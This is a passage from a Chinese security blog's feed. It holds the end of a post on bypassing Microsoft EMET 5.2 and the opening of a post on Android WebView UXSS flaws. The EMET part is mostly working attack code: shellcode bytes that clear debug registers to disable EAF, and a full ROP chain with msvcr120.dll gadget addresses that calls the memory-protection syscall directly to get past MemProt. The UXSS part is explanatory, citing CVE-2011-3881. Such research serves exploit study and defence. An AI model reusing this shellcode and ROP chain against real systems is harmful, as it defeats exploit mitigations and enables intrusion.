class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;ch], ecx      ; context.Dr2 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;h], ecx      ; context.Dr3 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;14&lt;/span&gt;h], ecx      ; context.Dr6 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;h], ecx      ; context.Dr7 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push    esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push    &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;fffffffeh                      ; current thread&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     edx, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call    dword ptr fs : [&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;C0h]           ; this also decrements ESP by &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add     esp, &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; + &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;cch + &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;disable_EAF = (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\xB8\x50\x01\x00\x00&quot;&lt;/span&gt; +            &lt;span class=&quot;comment&quot;&gt;# mov    eax,150h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x33\xC9&quot;&lt;/span&gt; +                        &lt;span class=&quot;comment&quot;&gt;# xor    ecx,ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x81\xEC\xCC\x02\x00\x00&quot;&lt;/span&gt; +        &lt;span class=&quot;comment&quot;&gt;# sub    esp,2CCh  ，makes space for CONTEXT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\xC7\x04\x24\x10\x00\x01\x00&quot;&lt;/span&gt; +    &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp],10010h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x04&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+4],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x08&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+8],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x0C&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+0Ch],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x10&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+10h],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x14&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+14h],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x89\x4C\x24\x18&quot;&lt;/span&gt; +                &lt;span class=&quot;comment&quot;&gt;# mov    dword ptr [esp+18h],ecx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x54&quot;&lt;/span&gt; +                            &lt;span class=&quot;comment&quot;&gt;# push   esp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x6A\xFE&quot;&lt;/span&gt; +                        &lt;span class=&quot;comment&quot;&gt;# push   0FFFFFFFEh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x8B\xD4&quot;&lt;/span&gt; +                        &lt;span class=&quot;comment&quot;&gt;# mov    edx,esp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x64\xFF\x15\xC0\x00\x00\x00&quot;&lt;/span&gt; +    &lt;span class=&quot;comment&quot;&gt;# call   dword ptr fs:[0C0h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;string&quot;&gt;&quot;\x81\xC4\xD8\x02\x00\x00&quot;&lt;/span&gt;          &lt;span class=&quot;comment&quot;&gt;# add    esp,2D8h&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        )&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;绕过EMET-5-2-MemProt保护：&quot;&gt;&lt;a href=&quot;#绕过EMET-5-2-MemProt保护：&quot; class=&quot;headerlink&quot; title=&quot;绕过EMET 5.2 MemProt保护：&quot;&gt;&lt;/a&gt;绕过EMET 5.2 MemProt保护：&lt;/h3&gt;&lt;h4 id=&quot;【保护原理】-1&quot;&gt;&lt;a href=&quot;#【保护原理】-1&quot; class=&quot;headerlink&quot; title=&quot;【保护原理】&quot;&gt;&lt;/a&gt;【保护原理】&lt;/h4&gt;&lt;p&gt;EMET对VirtualProtect和VirtuaProtectEx进行Hook，正常情况下，执行上述函数后调用ntdll!ZwProtectVirtualMemory，接着向eax=0x4d传递服务号，然后调用 call    dword ptr fs:[0C0h]，此时EDX传递5个参数（进程句柄、地址、大小、可读写执行权限、可写地址），然后继续执行下去。&lt;/p&gt;
&lt;h4 id=&quot;【绕过方法】-1&quot;&gt;&lt;a href=&quot;#【绕过方法】-1&quot; class=&quot;headerlink&quot; title=&quot;【绕过方法】&quot;&gt;&lt;/a&gt;【绕过方法】&lt;/h4&gt;&lt;p&gt;旧版EMET如4.1上，可以用VirtualAlloc/VirtuAllocEx。&lt;/p&gt;
&lt;p&gt;最新版EMET 5.2上，可以用后面执行的原始代码去代替被EMET HOOK的地方，即构造ROP，使得eax=0x4d，然后通过ntdll!NtQueryInformationThread中的call dword ptr fs:[0c0h]指令去执行。&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     msvcr120 = &lt;span class=&quot;number&quot;&gt;0x73c60000&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;# 固定基址，无ASLR保护模块msvcr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;comment&quot;&gt;# Delta used to fix the addresses based on the new base address of msvcr120.dll.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     md = msvcr120 - &lt;span class=&quot;number&quot;&gt;0x70480000&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;# 0x37E0000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &lt;span class=&quot;comment&quot;&gt;# EAX = ntdll!RtlExitUserThread&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7053b8fb&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# POP EAX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7056507c&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# IAT: &amp;amp;ntdll!RtlExitUserThread&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x70501e19&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# MOV EAX,DWORD PTR [EAX] # POP ESI # POP EBP # RETN ** [MSVCR120.dll] ** | asciiprint,ascii &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# EAX = ntdll!NtQueryInformationThread&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7049178a&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7049178a&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7049178a&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704a691c&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,DWORD PTR [EAX] # RETN ** [MSVCR120.dll] ** | asciiprint,ascii &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704ecd87&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,4 # POP ESI # POP EBP # RETN 0x04 ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7048f607&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# RETN (ROP NOP) [MSVCR120.dll]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x04&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# EAX -&amp;gt; &quot;call dword ptr fs:[0C0h] # add esp,4 # ret 14h&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7049178a&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# ADD EAX,8 # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704aa20f&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# INC EAX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704aa20f&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# INC EAX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704aa20f&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# INC EAX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# EBX -&amp;gt; &quot;call dword ptr fs:[0C0h] # add esp,4 # ret 14h&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704819e8&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# XCHG EAX,EBX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# ECX = 0; EAX = 0x4d&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704f2485&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# XOR ECX,ECX # MOV EAX,ECX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7053b8fb&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# POP EAX # RETN ** [MSVCR120.dll] ** | &amp;#123;PAGE_EXECUTE_READ&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x4d&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x704c0a08&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# JMP EBX&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x7055adf3&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# JMP ESP&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# for RETN 0x14&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# real_code:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x90901eeb&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# jmp skip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# args:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0xffffffff&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# current process handle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# &amp;amp;address = ptr to address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# &amp;amp;size = ptr to size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x40&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    md + &lt;span class=&quot;number&quot;&gt;0x705658f2&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# &amp;amp;Writable location [MSVCR120.dll]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# end_args:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;number&quot;&gt;0x11111111&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;# address     code_size + 8 # size&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# skip:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;绕过EMET-5-2-EAT保护：&quot;&gt;&lt;a href=&quot;#绕过EMET-5-2-EAT保护：&quot; class=&quot;headerlink&quot; title=&quot;绕过EMET 5.2 EAT保护：&quot;&gt;&lt;/a&gt;绕过EMET 5.2 EAT保护：&lt;/h3&gt;&lt;h4 id=&quot;【保护原理
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="EMET" scheme="http://riusksk.github.io/tags/EMET/"/>
    
      <category term="EAT" scheme="http://riusksk.github.io/tags/EAT/"/>
    
      <category term="MemProt" scheme="http://riusksk.github.io/tags/MemProt/"/>
    
  </entry>
  
  <entry>
    <title>Android Webview UXSS 漏洞攻防</title>
    <link href="http://riusksk.github.io/2014/10/09/Android-Webview-UXSS-%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/"/>
    <id>http://riusksk.github.io/2014/10/09/Android-Webview-UXSS-漏洞攻防/</id>
    <published>2014-10-08T16:00:00.000Z</published>
    <updated>2016-07-22T13:09:22.000Z</updated>
    
    <content type="html">&lt;center&gt;&lt;br&gt;“前事之不忘，后事之师”—— 《战国策·赵策》&lt;br&gt;&lt;/center&gt;

&lt;h3 id=&quot;【开篇：前车之鉴】&quot;&gt;&lt;a href=&quot;#【开篇：前车之鉴】&quot; class=&quot;headerlink&quot; title=&quot;【开篇：前车之鉴】&quot;&gt;&lt;/a&gt;【开篇：前车之鉴】&lt;/h3&gt;&lt;p&gt;随着移动互联网的发展，很多PC端的安全问题也在移动端逐步出现。比如，使用WebKit内核的Chrome浏览器此前就出现过各种通用型的XSS（即UXSS，见文末附注）【如图1】，现在Android上也出现同类漏洞。Google把WebKit移植到了Android上，并将其作为WebView组件封装在SDK中，但官方忘记了“前车之鉴”，导致曾经在WebKit出现过的漏洞，在Android系统上再一次重现，即使该漏洞在PC版Chrome上已修复过。&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/acfe50e658aa8b811fb79f15698c4641.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图1 ：Chrome UXSS漏洞列表&lt;br&gt;&lt;/center&gt;

&lt;p&gt;目前，许多Android应用是直接使用系统自带的WebView，进而导致系统上安装的各类应用可能受到WebView漏洞的影响，这就进一步将漏洞影响范围扩大化，使得各种主流应用都受其影响，一场未见销烟的血雨腥风就此展开。&lt;/p&gt;
&lt;h3 id=&quot;【中篇：血雨腥风】&quot;&gt;&lt;a href=&quot;#【中篇：血雨腥风】&quot; class=&quot;headerlink&quot; title=&quot;【中篇：血雨腥风】&quot;&gt;&lt;/a&gt;【中篇：血雨腥风】&lt;/h3&gt;&lt;p&gt;从2011年开始，Google的chromium项目的Bug列表就陆续被报告webkit存在一些UXSS漏洞。比如CVE-2011-3881 WebKitHTMLObjectElement UXSS漏洞，其对应的PoC代码【如图2】：&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;http://security.tencent.com/uploadimg_dir/201410/b5d36aab10d190d2baae741828d25e17.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;图2：CVE-2011-3881 PoC代码&lt;br&gt;&lt;/center&gt;

&lt;p&gt;该漏洞主要由于HTMLPlugInImageElement::allowedToLoadFrameURL函数中对Javascript URL地址校验不足导致的跨域问题。查看下修复前后的代码对比【如图3】，可以发现修复代码对使用Javascript伪协议的URL增加了安全检测，只有当前域与内嵌ifame域的serucityOrigin安全信息（比如protocol、domain、host、port等等）在许可范围内才能互相访问，即浏览器的“同源策略“。&lt;/p&gt;
